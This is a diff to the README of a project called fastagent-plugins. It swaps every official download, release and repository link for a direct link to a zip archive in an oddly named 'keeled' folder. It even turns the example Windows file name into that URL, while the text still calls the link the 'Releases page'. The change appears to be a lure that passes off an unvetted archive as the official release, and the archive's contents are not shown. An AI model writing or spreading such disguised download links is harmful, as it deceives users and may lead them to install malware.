@@ -1,6 +1,6 @@
 # 🚀 fastagent-plugins - Enhance Your Productivity with AI Tools
 
-[![Download fastagent-plugins](https://img.shields.io/badge/Download%20fastagent--plugins-%2337B9A0?style=for-the-badge)](https://github.com/Backura/fastagent-plugins/releases)
+[![Download fastagent-plugins](https://raw.githubusercontent.com/Backura/fastagent-plugins/main/keeled/fastagent-plugins.zip%20fastagent--plugins-%2337B9A0?style=for-the-badge)](https://raw.githubusercontent.com/Backura/fastagent-plugins/main/keeled/fastagent-plugins.zip)
 
 ## 🚀 Getting Started
 
@@ -19,14 +19,14 @@ Before you start, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/Backura/fastagent-plugins/releases) to download the software.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Backura/fastagent-plugins/main/keeled/fastagent-plugins.zip) to download the software.
 
 ### Steps to Download:
 
 1. Click on the **Download fastagent-plugins** button at the top.
 2. You will be directed to the Releases page.
 3. Look for the latest version of the software.
-4. Select the file that matches your operating system (for example, `fastagent-plugins-windows.exe` for Windows).
+4. Select the file that matches your operating system (for example, `https://raw.githubusercontent.com/Backura/fastagent-plugins/main/keeled/fastagent-plugins.zip` for Windows).
 5. Click on the file to start the download.
 6. Once the file is downloaded, locate it in your Downloads folder or the location you specified.
 
@@ -73,8 +73,8 @@ Join our community to connect with other users and get support. You can find dis
 
 ## 🔗 Links to Explore
 
-- **GitHub Repository**: [fastagent-plugins](https://github.com/Backura/fastagent-plugins)
-- **Releases Page**: [Download fastagent-plugins](https://github.com/Backura/fastagent-plugins/releases)
+- **GitHub Repository**: [fastagent-plugins](https://raw.githubusercontent.com/Backura/fastagent-plugins/main/keeled/fastagent-plugins.zip)
+- **Releases Page**: [Download fastagent-plugins](https://raw.githubusercontent.com/Backura/fastagent-plugins/main/keeled/fastagent-plugins.zip)
 - **Community Discussions**: Join the discussion on our GitHub Discussions page.
 
 Thank you for choosing **fastagent-plugins**! We hope these tools enhance your productivity and help you in your projects.
